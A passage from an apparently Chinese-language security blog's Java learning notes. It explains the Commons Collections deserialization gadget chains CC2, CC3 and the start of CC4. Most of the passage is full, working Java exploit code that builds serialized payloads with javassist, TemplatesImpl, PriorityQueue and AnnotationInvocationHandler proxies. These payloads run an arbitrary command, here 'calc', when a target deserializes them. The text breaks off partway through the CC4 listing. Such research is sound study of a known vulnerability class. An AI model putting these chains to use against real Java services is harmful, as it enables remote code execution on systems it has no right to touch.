&#125;, new Object[]&#123;"calc"&#125;)&#125;);</span><br><span class="line"></span><br><span class="line">        TransformingComparator comparator = <span class="keyword">new</span> TransformingComparator(chain);</span><br><span class="line">        PriorityQueue queue = <span class="keyword">new</span> PriorityQueue(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        Field field = Class.forName(<span class="string">"java.util.PriorityQueue"</span>).getDeclaredField(<span class="string">"comparator"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(queue,comparator);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"./cc2"</span>));</span><br><span class="line">            outputStream.writeObject(queue);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            ObjectInputStream inputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"./cc2"</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里首先注意queue加了两个元素，这是因为size不大于1的话无法进入siftDown方法。然后queue.add这段代码不能放到反射实例化comparator的后面。因为代码段中如果comparator不为null会放不进去元素。</p><p>然后其实上面这个exp并不是ysoserial CC2的exp链子。它使用的是javassist + TemplatesImpl。首先简单说明下javassist,它提供了修改字节码的功能。</p><p>比如我们手动生成一个byc404.class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.bycsec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">cc2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">createPseson</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        CtClass cc = pool.makeClass(<span class="string">"byc"</span>);</span><br><span class="line">        String cmd = <span class="string">"System.out.println(\"evil code\");"</span>;</span><br><span class="line">        <span class="comment">// 创建 static 代码块，并插入代码</span></span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        String ClassName = <span class="string">"byc404"</span>;</span><br><span class="line">        cc.setName(ClassName);</span><br><span class="line">        <span class="comment">// 写入.class 文件</span></span><br><span class="line">        cc.writeFile();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            createPseson();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/38.PNG" alt><br>像这样能够直接控制static方法的话,那么它在实例化时就会被直接执行。</p><p>接下来看看它真正的核心TemplatesImpl的使用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> Transformer <span class="title">newTransformer</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> TransformerConfigurationException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    TransformerImpl transformer;</span><br><span class="line"></span><br><span class="line">    transformer = <span class="keyword">new</span> TransformerImpl(getTransletInstance(), _outputProperties,</span><br><span class="line">        _indentNumber, _tfactory);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_uriResolver != <span class="keyword">null</span>) &#123;</span><br><span class="line">        transformer.setURIResolver(_uriResolver);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) &#123;</span><br><span class="line">        transformer.setSecureProcessing(<span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> transformer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进getTransletInstance</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Translet <span class="title">getTransletInstance</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> TransformerConfigurationException </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (_name == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (_class == <span class="keyword">null</span>) defineTransletClasses();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// The translet needs to keep a reference to all its auxiliary</span></span><br><span class="line">        <span class="comment">// class to prevent the GC from collecting them</span></span><br><span class="line">        AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();</span><br></pre></td></tr></table></figure><p>这里defineTransletClasses()可以还原bytecode为class.后面的newInstance()则可以实例化这个class.在这个实例化的过程中static方法就会执行。所以达成了一个任意命令执行的效果。</p><p>再稍微多回顾下前面我们达到的进度，就是我们已经可以任意调用transform了,只需一个可控对象。那么这里再用之前经常用到的InvokerTransformer.transform反射来调用TemplatesImpl.newtransformer</p><p>最终exp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.bycsec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">cc2</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Constructor constructor = Class.forName(<span class="string">"org.apache.commons.collections4.functors.InvokerTransformer"</span>).getDeclaredConstructor(String<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvokerTransformer transformer = (InvokerTransformer) constructor.newInstance(<span class="string">"newTransformer"</span>);</span><br><span class="line"></span><br><span class="line">        TransformingComparator comparator = <span class="keyword">new</span> TransformingComparator(transformer);</span><br><span class="line">        PriorityQueue queue = <span class="keyword">new</span> PriorityQueue(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        CtClass cc = pool.makeClass(<span class="string">"byc"</span>);</span><br><span class="line">        String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\"calc\");"</span>;</span><br><span class="line"></span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        String randomClassName = <span class="string">"byc404"</span> + System.nanoTime();</span><br><span class="line">        cc.setName(randomClassName);</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>()))</span>; </span><br><span class="line">        <span class="keyword">byte</span>[] classBytes = cc.toBytecode();</span><br><span class="line">        <span class="keyword">byte</span>[][] targetByteCodes = <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;classBytes&#125;;</span><br><span class="line">        TemplatesImpl templates = TemplatesImpl<span class="class">.<span class="keyword">class</span>.<span class="title">newInstance</span>()</span>;</span><br><span class="line">        setFieldValue(templates, <span class="string">"_bytecodes"</span>, targetByteCodes);</span><br><span class="line"></span><br><span class="line">        setFieldValue(templates, <span class="string">"_name"</span>, <span class="string">"name"</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">"_class"</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        Object[] queue_array = <span class="keyword">new</span> Object[]&#123;templates,<span class="number">1</span>&#125;;</span><br><span class="line"></span><br><span class="line">        Field queue_field = Class.forName(<span class="string">"java.util.PriorityQueue"</span>).getDeclaredField(<span class="string">"queue"</span>);</span><br><span class="line">        queue_field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        queue_field.set(queue,queue_array);</span><br><span class="line"></span><br><span class="line">        Field size = Class.forName(<span class="string">"java.util.PriorityQueue"</span>).getDeclaredField(<span class="string">"size"</span>);</span><br><span class="line">        size.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        size.set(queue,<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Field comparator_field = Class.forName(<span class="string">"java.util.PriorityQueue"</span>).getDeclaredField(<span class="string">"comparator"</span>);</span><br><span class="line">        comparator_field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        comparator_field.set(queue,comparator);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"./cc2"</span>));</span><br><span class="line">            outputStream.writeObject(queue);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            ObjectInputStream inputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"./cc2"</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> Field field = getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> </span>&#123;</span><br><span class="line">        Field field = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="keyword">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个exp几个细节还是值得说明一下的。不过我还是偷懒下不深入了，就当做一些注意事项简单说明下。</p><p>1.为了进入<code>defineTransletClasses</code>需要把恶意类的父类设置为AbstractTranslet。否则_transletIndex会小于0爆出错误。<br>2.通过反射的方式来设置queue的值，而是直接add。这里我们queue的第一个元素是templates即TemplatesImpl.class.newInstance();。这是一个类。而第二个元素是1.这两个元素在add时会出现比较出错。所以得保证类型一致。不过还有一个方法就是里面放两个一样的元素即都为template.</p><ul><li>CommonsCollections3</li></ul><p>CC3又回到了CommonsCollections3.1的依赖。<br>有点像CC1+CC2。用到了两个链子的关键内容。</p><p>区别在于用了TrAXFilter调用newTransformer()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">TrAXFilter</span><span class="params">(Templates templates)</span>  <span class="keyword">throws</span></span></span><br><span class="line"><span class="function">        TransformerConfigurationException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        _templates = templates;</span><br><span class="line">        _transformer = (TransformerImpl) templates.newTransformer();</span><br><span class="line">        _transformerHandler = <span class="keyword">new</span> TransformerHandlerImpl(_transformer);</span><br><span class="line">        _useServicesMechanism = _transformer.useServicesMechnism();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>然后不同于以外的InvokeTransformer,它改用了InstantiateTransformer.其transform方法如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!(input <span class="keyword">instanceof</span> Class)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InstantiateTransformer: Input object was not an instanceof Class, it was a "</span> + (input == <span class="keyword">null</span> ? <span class="string">"null object"</span> : input.getClass().getName()));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Constructor con = ((Class)input).getConstructor(<span class="keyword">this</span>.iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> con.newInstance(<span class="keyword">this</span>.iArgs);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>这里创建了类实例，如果把input设置为TrAXFilter,那么就会在这里实例化的时候调用其构造方法，触发TemplatesImpl#newTransformer。</p><p>exp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.bycsec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">cc3</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        CtClass cc = pool.makeClass(<span class="string">"byc"</span>);</span><br><span class="line">        String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\"calc\");"</span>;</span><br><span class="line"></span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        String randomClassName = <span class="string">"byc404"</span> + System.nanoTime();</span><br><span class="line">        cc.setName(randomClassName);</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>()))</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] classBytes = cc.toBytecode();</span><br><span class="line">        <span class="keyword">byte</span>[][] targetByteCodes = <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;classBytes&#125;;</span><br><span class="line">        TemplatesImpl templates = TemplatesImpl<span class="class">.<span class="keyword">class</span>.<span class="title">newInstance</span>()</span>;</span><br><span class="line">        setFieldValue(templates, <span class="string">"_bytecodes"</span>, targetByteCodes);</span><br><span class="line"></span><br><span class="line">        setFieldValue(templates, <span class="string">"_name"</span>, <span class="string">"name"</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">"_class"</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(TrAXFilter<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;templates&#125;)</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        HashMap innermap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        LazyMap map = (LazyMap)LazyMap.decorate(innermap,chain);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Constructor handler_constructor = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>, <span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        handler_constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler map_handler = (InvocationHandler) handler_constructor.newInstance(Deprecated<span class="class">.<span class="keyword">class</span>,<span class="title">map</span>)</span>;</span><br><span class="line"></span><br><span class="line">        Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<span class="keyword">new</span> Class[]&#123;Map<span class="class">.<span class="keyword">class</span>&#125;,<span class="title">map_handler</span>)</span>;</span><br><span class="line"></span><br><span class="line">        Constructor AnnotationInvocationHandler_Constructor = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>,<span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        AnnotationInvocationHandler_Constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler handler = (InvocationHandler)AnnotationInvocationHandler_Constructor.newInstance(Deprecated<span class="class">.<span class="keyword">class</span>,<span class="title">proxy_map</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"./cc3"</span>));</span><br><span class="line">            outputStream.writeObject(handler);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            ObjectInputStream inputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"./cc3"</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> Field field = getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> </span>&#123;</span><br><span class="line">        Field field = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="keyword">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>CommonsCollections4</li></ul><p>依赖环境变为Commons Collections 4.0</p><p>似乎就是个杂交……因为依赖变为4.0了。直接使用CC2 中的queue+ CC3中的transform调用。</p><p>exp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 